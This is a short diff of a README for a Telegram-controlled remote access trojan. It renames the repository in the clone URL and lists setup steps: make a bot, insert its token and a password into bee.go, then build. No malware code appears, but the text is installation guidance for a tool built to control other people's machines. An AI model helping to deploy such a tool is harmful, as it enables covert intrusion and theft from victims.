@@ -10,7 +10,7 @@ You don't need a server to use this rat but a telegram bot.
 # Installation
 
 1) Create Telegram bot and save the token
-2) Clone the repo with `git clone https://github.com/phlmox/GoRat` and put your telegram bot token to the bee.go file. (Line 191)
+2) Clone the repo with `git clone https://github.com/phlmox/BeeRat` and put your telegram bot token to the bee.go file. (Line 191)
 3) Set your password in Line 192. (You'll use it to login telegram bot panel.)
 4) Build the bee.go:
 
